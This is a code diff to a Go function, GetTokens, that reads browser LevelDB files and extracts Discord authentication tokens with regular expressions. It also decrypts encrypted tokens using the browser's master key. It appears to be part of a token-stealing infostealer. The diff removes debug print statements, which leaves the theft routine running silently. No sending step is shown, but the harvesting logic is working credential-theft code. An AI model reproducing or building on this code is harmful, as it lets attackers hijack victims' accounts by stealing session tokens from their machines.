@@ -107,7 +107,6 @@ func GetTokens(goodBrowsers []structs.Browser) string {
 			}
 
 			for _, ldbLog := range ldbFiles {
-				fmt.Println(ldbLog)
 				data, err := os.ReadFile(ldbLog)
 				if err != nil {
 					continue
@@ -115,9 +114,7 @@ func GetTokens(goodBrowsers []structs.Browser) string {
 				normal_regex_mem, err := regexp.Compile(`[\w-]{26}\.[\w-]{6}\.[\w-]{25,110}|mfa\.[\w-]{80,95}`)
 				if err == nil {
 					if string(normal_regex_mem.Find(data)) != "" {
-						fmt.Println("Found Token")
 						t := string(normal_regex_mem.Find(data))
-						fmt.Println(t)
 						tokens_current = append(tokens_current, t)
 					}
 				}
@@ -125,7 +122,6 @@ func GetTokens(goodBrowsers []structs.Browser) string {
 				encrypted_regex_mem, err := regexp.Compile(`dQw4w9WgXcQ:[^\"]*`)
 				if err == nil {
 					if string(encrypted_regex_mem.Find(data)) != "" {
-						fmt.Println("Found Token")
 						t := string(encrypted_regex_mem.Find(data))
 						good_code := strings.Split(t, ":")[1]
 						decoded, err := base64.StdEncoding.DecodeString(good_code)
@@ -135,7 +131,6 @@ func GetTokens(goodBrowsers []structs.Browser) string {
 						good_dir_local_state := browser.LocalState
 						good_key := decryption.GetMasterKey(good_dir_local_state)
 						decrypted, _ := decryption.DecryptPassword(decoded, good_key)
-						fmt.Println(decrypted)
 						tokens_current = append(tokens_current, decrypted)
 					}
 				}
